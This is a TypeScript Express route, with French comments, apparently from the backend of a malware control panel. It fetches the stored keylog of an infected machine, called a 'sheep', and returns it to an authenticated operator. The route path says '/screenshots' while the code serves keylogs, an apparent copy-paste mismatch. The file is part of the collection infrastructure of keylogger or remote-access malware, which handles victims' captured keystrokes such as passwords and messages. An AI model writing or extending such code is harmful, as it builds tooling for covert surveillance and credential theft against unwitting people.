import { Request, Response } from 'express';
import Sheep from '../../../../mongo/models/sheep';

export default {
    handle: "/screenshots",
    method: "POST",
    description: "Keylog route",
    route: async (req: Request, res: Response) => {
        try {
            if (!res.locals.auth || !res.locals.auth.cookie.auth) return res.status(401).json({ success: false, message: 'No token provided' });
            if (!res.locals.auth.user) return res.status(404).json({ success: false, error: "User not found" });

            // Vérifiez si les détails du keylog sont fournis
            const { sheepId }: { sheepId: string } = req.body;
            if (!sheepId) return res.status(400).json({ success: false, error: "No sheepId provided" });

            // Vérifiez si le Sheep existe
            const sheep = await Sheep.findById(sheepId).catch(() => null);
            if (!sheep) return res.status(404).json({ success: false, error: "Sheep not found" });

            // Renvoyez les données de keylog du Sheep
            res.status(200).json({ success: true, keylog: sheep.keylog });
        } catch (error) {
            res.status(500).json({ success: false, error: "An error occurred while retrieving the keylog" });
        }
    }
};

/*
Exemple de requête:
{
    "userId": "60b8d6c8f8d2b5416c0a4b3c",
    "sheepId": "60b8d6c8f8d2b5416c0a4b3d"
}
*/
